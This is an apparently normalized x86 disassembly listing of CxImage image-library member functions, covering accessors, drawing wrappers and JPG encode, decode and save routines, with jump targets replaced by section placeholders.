mov [ ebp - 0x4 ] ecx
mov [ ebp + 0xb ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x150 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?IsTransparent@CxImage@@QBE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x14c ] 0x0
setge cl
mov al cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetCodecOption@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x188 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetCodecOption@CxImage@@QAEXK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x188 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?GetFlags@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?IsIndexed@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x28 ] 0x0
setne cl
mov al cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Draw@CxImage@@QAEJPAUHDC__@@ABUtagRECT@@PAU3@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + 0xc ]
sub eax [ edx + 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + 0x8 ]
sub eax [ edx ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Draw@CxImage@@QAEJPAUHDC__@@JJJJPAUtagRECT@@@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
?Stretch@CxImage@@QAEJPAUHDC__@@ABUtagRECT@@K@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + 0xc ]
sub eax [ edx + 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + 0x8 ]
sub eax [ edx ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Stretch@CxImage@@QAEJPAUHDC__@@JJJJK@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
?Draw2@CxImage@@QAEJPAUHDC__@@ABUtagRECT@@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0xc ]
sub edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
sub edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Draw2@CxImage@@QAEJPAUHDC__@@JJJJ@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?IsValid@CxImage@@QBE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x4 ] 0x0
setne cl
mov al cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?IsEnabled@CxImage@@QBE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17e ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Enable@CxImage@@QAEX_N@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x8 ]
mov [ eax + 0x17e ] cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?GetNumFrames@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x15c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetFrame@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x158 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetFrame@CxImage@@QAEXJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x158 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?Crop@CxImage@@QAE_NABUtagRECT@@PAV1@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Crop@CxImage@@QAE_NJJJJPAV1@@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?SelectionIsValid@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x19c ] 0x0
setne cl
mov al cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SelectionGetBox@CxImage@@QAEXAAUtagRECT@@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x10
mov eax [ ebp - 0x4 ]
add eax 0x16c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call memcpy
add esp 0xc
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?AlphaGetMax@CxImage@@QBEEXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?AlphaSetMax@CxImage@@QAEXE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x8 ]
mov [ eax + 0x17c ] cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?AlphaIsValid@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x1a0 ] 0x0
setne cl
mov al cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?AlphaGetBits@CxImage@@QBEPAEXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?AlphaPaletteEnable@CxImage@@QAEX_N@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x8 ]
mov [ eax + 0x17d ] cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?AlphaPaletteIsEnabled@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17d ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetParent@CxImage@@QBEPAV1@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetNumLayers@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x194 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
??_FCxImage@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call ??0CxImage@@QAE@K@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
??_OCxImage@@QAEXABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x1
push 0x1
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??0CxImage@@QAE@ABV0@_N11@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
sub_40e830
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0x2
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call ??1CxImage@@UAE@XZ
mov eax [ ebp + 0x8 ]
and eax 0x1
test eax eax
je r-xdata
push ??1CxImage@@UAE@XZ
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x4 ]
push edx
push 0x1a8
mov eax [ ebp - 0x4 ]
push eax
call sub_419250
mov ecx [ ebp + 0x8 ]
and ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp - 0x4 ]
sub eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x4
push edx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??1CxImageJPG@@UAE@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxImageJPG::`vbtable'
mov ecx [ ebp - 0x4 ]
call ??1CxImage@@UAE@XZ
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Decode@CxImageJPG@@QAE_NPAU_iobuf@@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434bf9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x60 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
call ??0CxIOFile@@QAE@PAU_iobuf@@@Z
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?Decode@CxImageJPG@@QAE_NPAVCxFile@@@Z
mov [ ebp - 0x20 ] al
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x60
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?Encode@CxImageJPG@@QAE_NPAU_iobuf@@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434c19
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x60 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
call ??0CxIOFile@@QAE@PAU_iobuf@@@Z
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?Encode@CxImageJPG@@QAE_NPAVCxFile@@@Z
mov [ ebp - 0x20 ] al
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x60
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?DecodeExif@CxImageJPG@@QAE_NPAU_iobuf@@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434c39
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x60 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
call ??0CxIOFile@@QAE@PAU_iobuf@@@Z
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?DecodeExif@CxImageJPG@@QAE_NPAVCxFile@@@Z
mov [ ebp - 0x20 ] al
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x60
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??0CxImageJPG@@QAE@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x1
push 0x1
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??0CxImage@@QAE@ABV0@_N11@Z
mov esi [ ebp + 0x8 ]
add esi 0x1a8
mov edi [ ebp - 0x4 ]
add edi 0x1a8
mov ecx 0x12e
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x660 ]
mov [ ecx + 0x660 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x664 ]
mov [ ecx + 0x664 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x668 ]
mov [ ecx + 0x668 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x66c ]
mov [ ecx + 0x66c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x670 ]
mov [ ecx + 0x670 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] CxImageJPG::`vbtable'
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??4CxImageJPG@@QAEAAV0@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??4CxImage@@QAEAAV0@ABV0@@Z
mov esi [ ebp + 0x8 ]
add esi 0x1a8
mov edi [ ebp - 0x4 ]
add edi 0x1a8
mov ecx 0x12e
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x660 ]
mov [ ecx + 0x660 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x664 ]
mov [ ecx + 0x664 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x668 ]
mov [ ecx + 0x668 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x66c ]
mov [ ecx + 0x66c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x670 ]
mov [ ecx + 0x670 ] eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
sub_40ec50
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0x2
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call ??1CxImageJPG@@UAE@XZ
mov eax [ ebp + 0x8 ]
and eax 0x1
test eax eax
je r-xdata
push ??1CxImageJPG@@UAE@XZ
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x4 ]
push edx
push 0x674
mov eax [ ebp - 0x4 ]
push eax
call sub_419250
mov ecx [ ebp + 0x8 ]
and ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp - 0x4 ]
sub eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x4
push edx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?EncodeSafeCheck@CxImage@@IAE_NPAVCxFile@@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
call strcpy
add esp 0x8
mov al 0x1
jmp r-xdata
xor al al
push r--data
mov edx [ ebp - 0x4 ]
add edx 0x44
push edx
call strcpy
add esp 0x8
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?Save@CxImage@@QAE_NPBDK@Z
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov esi esp
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call [ fopen@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Encode@CxImage@@QAE_NPAU_iobuf@@K@Z
mov [ ebp - 0xc ] al
mov esi esp
mov eax [ ebp - 0x8 ]
push eax
call [ fclose@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov al [ ebp - 0xc ]
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?Encode@CxImage@@QAE_NPAU_iobuf@@K@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434c59
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x60 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
call ??0CxIOFile@@QAE@PAU_iobuf@@@Z
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x1c ]
push edx
mov ecx [ ebp - 0x10 ]
call ?Encode@CxImage@@QAE_NPAVCxFile@@K@Z
mov [ ebp - 0x20 ] al
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x60
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?Encode@CxImage@@QAE_NAAPAEAAJK@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434c79
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x64
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x70 ]
mov ecx 0x19
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0x28 ]
call ??0CxMemFile@@QAE@PAEK@Z
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call ?Open@CxMemFile@@QAE_NXZ
mov ecx [ ebp + 0x10 ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?Encode@CxImage@@QAE_NPAVCxFile@@K@Z
and eax 0xff
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call ??1CxMemFile@@UAE@XZ
mov al [ ebp - 0x30 ]
push 0x1
lea ecx [ ebp - 0x28 ]
call ?GetBuffer@CxMemFile@@QAEPAE_N@Z
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
lea ecx [ ebp - 0x28 ]
call ?Size@CxMemFile@@UAEJXZ
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call ??1CxMemFile@@UAE@XZ
mov al [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x70
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
?Encode@CxImage@@QAE_NPAVCxFile@@K@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434c9c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6c0
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x6cc ]
mov ecx 0x1b0
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
cmp [ ebp + 0xc ] 0x3
jne r-xdata
push r--data
mov eax [ ebp - 0x10 ]
add eax 0x44
push eax
call strcpy
add esp 0x8
xor al al
lea ecx [ ebp - 0x684 ]
call ??0CxImageJPG@@QAE@XZ
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x684 ]
call ?Ghost@CxImage@@IAEXPAV1@@Z
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x684 ]
call ?Encode@CxImageJPG@@QAE_NPAVCxFile@@@Z
and eax 0xff
test eax eax
je r-xdata
lea ecx [ ebp - 0x684 ]
call ?GetLastError@CxImage@@QAEPADXZ
push eax
mov edx [ ebp - 0x10 ]
add edx 0x44
push edx
call strcpy
add esp 0x8
